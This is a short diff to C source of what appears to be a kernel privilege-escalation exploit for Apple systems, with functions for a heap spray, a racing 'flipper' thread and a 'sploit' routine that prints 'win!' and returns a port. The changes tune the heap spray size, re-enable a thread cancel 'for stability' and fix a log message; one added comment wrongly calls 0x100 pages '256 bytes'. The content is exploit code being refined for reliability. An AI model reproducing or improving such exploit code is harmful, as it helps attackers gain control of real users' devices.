@@ -749,8 +749,8 @@ add_heap_spray_to_dictionary(
 {
   void* heapspray_contents =  (void*) build_spray_page();
   
-  size_t heapspray_page_size = 0x4000;
-  size_t n_heapspray_pages = 0x200; // 0x100 works too
+  size_t heapspray_page_size = 0x4000; //16384 bytes
+  size_t n_heapspray_pages = 0x100; //  0x100 (256 bytes) works too
   size_t full_heapspray_size = n_heapspray_pages * heapspray_page_size;
   
   kern_return_t err;
@@ -919,7 +919,7 @@ sploit(
         printf("win!\n");
         
         // stop the flipper thread:
-        //pthread_cancel(th);
+        pthread_cancel(th); //More stable, idk why it was commented out.
         stop_flipper_thread = 1;
         pthread_join(th, NULL);
         
@@ -957,7 +957,7 @@ int do_exploit() {
   logMsg(target_service_name);
   logMsg("target selector:");
     logMsg(target_selector);
-  logMsg("\Gathering some gopniks to dance with...");
+  logMsg("Gathering some gopniks to dance with...");
   mach_port_t tp = sploit(target_service_name, target_selector);
   if (tp != MACH_PORT_NULL){
     printf("Gopniks are united at: %x\n", tp);
